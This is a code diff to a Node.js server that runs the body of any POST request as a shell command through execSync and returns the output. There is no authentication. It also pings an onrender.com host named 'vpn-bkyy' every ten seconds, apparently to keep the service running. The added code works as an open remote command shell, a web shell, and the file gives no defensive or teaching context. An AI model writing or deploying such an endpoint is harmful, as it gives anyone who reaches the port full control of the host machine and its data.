@@ -1,17 +1,24 @@
 const { exec, execSync } = require("child_process");
 const http = require("http")
 
-http.createServer((req,res)=>{
-    if (req.method === "POST") {
-        try{
-            console.log(execSync(req.body,{encoding:"utf8"}));
-        }catch(err){
-            console.log("err "+ err)
+http.createServer((req, res) => {
+    let body = "";
+    req.on("readable", () => {
+        body += req.read();
+    });
+    req.on("end", () => {
+        console.log(body);
+        if (req.method === "POST") {
+            try {
+                res.write(execSync(body, { encoding: "utf8" }));
+            } catch (err) {
+                res.write("err " + err);
+            }
         }
-    }
-    res.write("alive")
-    res.end()
-}).listen(3000)
+        else res.write("alive");
+        res.end();
+    })
+}).listen(3000);
 setInterval(()=>{
     fetch("https://vpn-bkyy.onrender.com")
 },10000)
